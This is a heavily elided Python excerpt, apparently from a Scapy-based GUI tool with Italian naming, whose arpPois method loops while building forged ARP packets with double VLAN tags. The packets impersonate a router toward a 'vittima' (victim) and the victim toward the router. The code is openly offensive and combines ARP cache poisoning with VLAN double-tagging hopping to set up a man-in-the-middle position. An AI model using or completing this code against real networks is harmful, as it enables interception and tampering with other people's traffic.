...
class GUI:
    ...
    def arpPois(self):
        ...
        while self.statoStop:
            ...
            packetR = Dot1Q(vlan=1)/Dot1Q(vlan=2)/ARP(op=2,pdst=self.contVittima,hwsrc=mymac,hwdst=self.macV,psrc=self.contRouter)
        
        # finto router -> vittima
            packetV = Dot1Q(vlan=1)/Dot1Q(vlan=2)/ARP(op="who-has",pdst=self.contRouter,hwsrc=mymac,hwdst=self.macR,psrc=self.contVittima)
